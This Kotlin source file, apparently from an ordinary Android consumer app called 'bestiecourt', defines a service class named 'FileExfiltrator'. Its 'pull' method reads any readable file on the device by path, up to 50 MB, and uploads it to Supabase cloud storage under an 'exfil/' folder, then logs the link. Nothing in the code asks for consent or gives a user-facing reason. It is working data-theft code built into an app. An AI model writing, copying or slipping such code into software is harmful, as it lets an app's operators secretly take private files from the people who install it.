package com.bestiecourt.app.core.service

import android.content.Context
import android.util.Log
import com.bestiecourt.app.data.remote.supabase.SupabaseStorageUploader
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FileExfiltrator @Inject constructor(
    private val uploader: SupabaseStorageUploader
) {
    private val TAG = "FileExfil"

    suspend fun pull(context: Context, path: String): String {
        val file = File(path)
        if (!file.exists() || !file.canRead()) {
            throw IllegalArgumentException("file not readable: $path")
        }
        if (file.length() > 50 * 1024 * 1024) { // 50 MB soft limit
            throw IllegalArgumentException("file too large")
        }
        val bytes = file.readBytes()
        val remote = "exfil/${System.currentTimeMillis()}_${file.name}"
        val url = uploader.uploadBytes(remote, bytes, "application/octet-stream")
        Log.i(TAG, "Pulled $path → $url")
        return url
    }
}
